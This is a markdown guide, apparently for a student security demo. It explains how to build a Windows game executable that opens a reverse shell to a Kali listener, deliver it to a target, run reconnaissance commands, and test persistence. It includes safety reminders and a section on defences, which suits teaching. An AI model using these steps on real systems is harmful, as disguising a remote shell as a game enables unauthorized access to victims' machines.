# Kali Linux Setup Guide (Attacker Machine)

## Quick Setup

### 1. Get Your Kali IP Address

```bash
ip addr show
# or
ifconfig
# or
hostname -I
```

Example output: `192.168.1.100`

### 2. Configure Firewall

Allow incoming connections on port 4444:

```bash
# Check firewall status
sudo ufw status

# Allow port 4444
sudo ufw allow 4444/tcp

# Or temporarily disable firewall for testing
sudo ufw disable
```

### 3. Update config.py

Before building the Windows .exe, update the IP:

```bash
nano config.py
```

Change:
```python
LISTENER_HOST = '192.168.1.100'  # Your Kali IP here
```

### 4. Build the Windows .exe

```bash
python3 build_windows_exe.py
```

The .exe will be created in `dist/AlienInvasion.exe`

### 5. Transfer to Windows Target

Copy these files to Windows machine:
- `dist/AlienInvasion.exe`
- `images/` folder (entire folder)

You can use:
- USB drive
- Network share
- Python HTTP server:
```bash
cd dist
python3 -m http.server 8000
# On Windows, browse to http://KALI_IP:8000
```

### 6. Start the Listener

```bash
python3 listener.py
```

Expected output:
```
[*] Listener started on 0.0.0.0:4444
[*] Waiting for connection...
```

### 7. Run Game on Windows

On the Windows target machine:
1. Double-click `AlienInvasion.exe`
2. Accept the consent dialog
3. Game starts

### 8. Verify Connection

On Kali, you should see:
```
[+] Connection received from 192.168.1.50:xxxxx
[*] Shell access established.

shell>
```

### 9. Execute Commands

Try these commands:
```bash
shell> whoami
shell> hostname
shell> dir
shell> ipconfig
shell> tasklist
shell> systeminfo
```

---

## Network Setup Options

### Option 1: Same Network (Easiest)

Both machines on same WiFi/LAN:
- Kali: `192.168.1.100`
- Windows: `192.168.1.50`
- They can ping each other

### Option 2: Virtual Network (VirtualBox/VMware)

**VirtualBox:**
1. Set both VMs to "Bridged Adapter" or "NAT Network"
2. Verify connectivity with ping

**VMware:**
1. Set both VMs to "Bridged" or "NAT"
2. Verify connectivity with ping

### Option 3: Host-Only Network

For isolated testing:
1. Create host-only network in VM software
2. Assign both VMs to this network
3. No internet access (safer for testing)

---

## Testing Checklist

Before the presentation:

- [ ] Kali IP address identified
- [ ] config.py updated with correct IP
- [ ] Firewall configured (port 4444 open)
- [ ] .exe built successfully
- [ ] Files transferred to Windows VM
- [ ] Network connectivity verified (ping test)
- [ ] Listener starts without errors
- [ ] Game connects successfully
- [ ] Commands execute properly
- [ ] Persistence works after reboot
- [ ] Cleanup tool removes persistence

---

## Troubleshooting

### No Connection Received

1. **Check firewall:**
```bash
sudo ufw status
sudo ufw allow 4444
```

2. **Check listener is running:**
```bash
ps aux | grep listener
```

3. **Check network connectivity:**
```bash
# On Kali
ip addr show

# On Windows (cmd)
ping KALI_IP
```

4. **Check IP in config.py matches Kali IP**

### Connection Drops

1. **Check for network issues**
2. **Verify firewall isn't blocking**
3. **Check Windows Firewall on target**

### Commands Don't Execute

1. **Check Windows permissions**
2. **Try simple commands first (whoami, dir)**
3. **Check for antivirus interference**

---

## Advanced: Port Forwarding (Optional)

If you want to test over internet (NOT RECOMMENDED for assignment):

### On Kali (behind router):

1. **Forward port on router:**
   - Router settings → Port Forwarding
   - External port: 4444
   - Internal IP: Your Kali IP
   - Internal port: 4444

2. **Use public IP in config.py:**
```python
LISTENER_HOST = 'YOUR_PUBLIC_IP'  # From whatismyip.com
```

**WARNING:** Only do this in controlled environment!

---

## Presentation Tips

### Demo Script:

1. **Show Kali terminal:**
```bash
# Show IP
ip addr show

# Show listener starting
python3 listener.py
```

2. **Explain what's happening:**
   - "This is the attacker machine running Kali Linux"
   - "The listener is waiting for the target to connect"
   - "Port 4444 is open and listening"

3. **Switch to Windows:**
   - "This is a normal Windows user"
   - "They download what looks like a game"
   - "No Python installed, just a .exe file"

4. **Run the game:**
   - Show consent dialog
   - "Notice the transparency - user knows what's happening"
   - "This is for educational purposes"

5. **Back to Kali:**
   - "Connection received!"
   - "We now have shell access"
   - Execute commands to demonstrate

6. **Explain the techniques:**
   - Reverse shell (target connects to us)
   - Bypasses firewalls
   - Persistence mechanisms
   - Social engineering aspect

7. **Show defenses:**
   - How to detect (netstat, task manager)
   - How to prevent (antivirus, whitelisting)
   - Importance of security awareness

---

## Command Reference

### Useful Windows Commands (from shell):

```bash
# System info
systeminfo
whoami
hostname

# Network info
ipconfig
netstat -an

# File system
dir
cd C:\Users
type file.txt

# Processes
tasklist
taskkill /F /PID 1234

# User info
net user
net localgroup administrators
```

### Useful Linux Commands (if testing on Linux target):

```bash
# System info
uname -a
whoami
hostname

# Network info
ifconfig
netstat -tulpn

# File system
ls -la
pwd
cat /etc/passwd

# Processes
ps aux
kill -9 PID
```

---

## Safety Reminders

1. **Only test in VMs**
2. **Isolated network preferred**
3. **Never use on real systems without permission**
4. **This is for education only**
5. **Understand the legal implications**
6. **Be prepared to explain ethical considerations**

---

## Quick Start (Day of Presentation)

```bash
# 1. Start Kali VM
# 2. Open terminal
cd ~/Documents/Space-Shooter

# 3. Check IP
ip addr show

# 4. Start listener
python3 listener.py

# 5. On Windows, run AlienInvasion.exe
# 6. Wait for connection
# 7. Execute commands
# 8. Demonstrate features
```

Good luck! 🎯
